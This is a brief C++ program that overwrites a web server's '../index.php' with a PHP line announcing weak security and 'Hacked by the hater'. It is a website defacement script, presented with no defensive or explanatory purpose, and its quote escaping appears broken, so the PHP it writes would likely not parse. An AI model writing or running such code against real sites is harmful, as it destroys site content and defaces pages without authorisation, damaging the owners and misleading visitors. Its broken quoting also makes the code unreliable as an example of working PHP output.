#include <iostream>
#include <fstream>
using namespace std;
int main()
{
	ofstream fout("../index.php");
	fout<<"<?php echo 'Securitate slaba. Hacked by \'the hater\';'?>";
	fout.close();
}
